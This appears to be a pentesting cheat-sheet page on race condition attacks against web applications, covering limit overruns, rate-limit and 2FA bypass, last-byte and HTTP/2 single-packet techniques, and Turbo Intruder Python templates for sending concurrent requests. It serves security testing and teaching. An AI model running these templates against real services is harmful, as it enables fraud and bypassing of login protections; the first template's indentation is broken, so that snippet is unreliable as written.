# Race Condition

> Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language.

## Methodology

### Limit-overrun

Limit-overrun refers to a scenario where multiple threads or processes compete to update or access a shared resource, resulting in the resource exceeding its intended limits.

**Examples**: Overdrawing limit, multiple voting, multiple spending of a giftcard.

- [Register multiple users using one invitation - @franjkovic](https://hackerone.com/reports/148609)

### Rate-limit Bypass

Rate-limit bypass occurs when an attacker exploits the lack of proper synchronization in rate-limiting mechanisms to exceed intended request limits. Rate-limiting is designed to control the frequency of actions (e.g., API requests, login attempts), but race conditions can allow attackers to bypass these restrictions.

**Examples**: Bypassing anti-bruteforce mechanism and 2FA.

## Techniques

### HTTP/1.1 Last-byte Synchronization

Send every requests except the last byte, then "release" each request by sending the last byte.

Execute a last-byte synchronization using Turbo Intruder

```py
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

**Examples**:

### HTTP/2 Single-packet Attack

In HTTP/2 you can send multiple HTTP requests concurrently over a single connection. In the single-packet attack around ~20/30 requests will be sent and they will arrive at the same time on the server. Using a single request remove the network jitter.

- [PortSwigger/turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
- Burp Suite
    - Send a request to Repeater
    - Duplicate the request 20 times (CTRL+R)
    - Create a new group and add all the requests
    - Send group in parallel (single-packet attack)

**Examples**:

## Turbo Intruder

### Example 1

1. Send request to turbo intruder
2. Use this python code as a payload of the turbo intruder

   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseInput, gate='race1')


       engine.start(timeout=5)
   engine.openGate('race1')

       engine.complete(timeout=60)


   def handleResponse(req, interesting):
       table.add(req)
   ```

3. Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder
4. Click "Attack"

### Example 2

This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    '''

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)
def handleResponse(req, interesting):
    table.add(req)
```
